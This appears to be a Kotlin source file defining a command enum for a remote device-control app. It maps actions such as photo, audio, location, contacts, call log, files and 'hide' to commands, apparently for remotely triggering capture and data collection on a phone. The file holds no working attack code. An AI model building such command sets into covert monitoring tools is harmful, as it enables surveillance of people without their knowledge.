package com.vlink.consent

enum class CmdSpec {
    PHOTO, VIDEO, AUDIO, LOCATION, RING, VIBRATE, HIDE, SHOW, FLUSH,
    GALLERY, FILES, CALLLOG, CONTACTS, APPS, BATTERY, SCHED, WAKE, SCREEN_OFF;

    companion object {
        fun of(action: String): CmdSpec? = when (action) {
            "photo" -> PHOTO
            "video" -> VIDEO
            "audio" -> AUDIO
            "location" -> LOCATION
            "ring" -> RING
            "vibrate" -> VIBRATE
            "hide" -> HIDE
            "show" -> SHOW
            "flush" -> FLUSH
            "gallery" -> GALLERY
            "files" -> FILES
            "calllog" -> CALLLOG
            "contacts" -> CONTACTS
            "apps" -> APPS
            "battery" -> BATTERY
            "sched" -> SCHED
            "wake" -> WAKE
            "screen_off" -> SCREEN_OFF
            else -> null
        }
    }
}
